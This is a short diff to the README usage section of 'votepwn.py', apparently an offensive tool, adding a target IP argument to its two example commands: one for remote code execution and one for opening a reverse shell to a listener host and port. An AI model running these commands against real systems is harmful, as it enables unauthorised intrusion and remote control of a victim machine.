@@ -1,11 +1,11 @@
 ## Usage
 - Remote code execution
 ```bash
-python3 votepwn.py -rce -u <username> -p <password> 
+python3 votepwn.py -rce <ip> -u <username> -p <password> 
 ```
 - Reverse shell
 ```bash
-python3 votepwn.py -rs -u <username> -p <password> -lh <lhost> -lp <lport>
+python3 votepwn.py -rs <ip> -u <username> -p <password> -lh <lhost> -lp <lport>
 ```
 **Notes:**
 
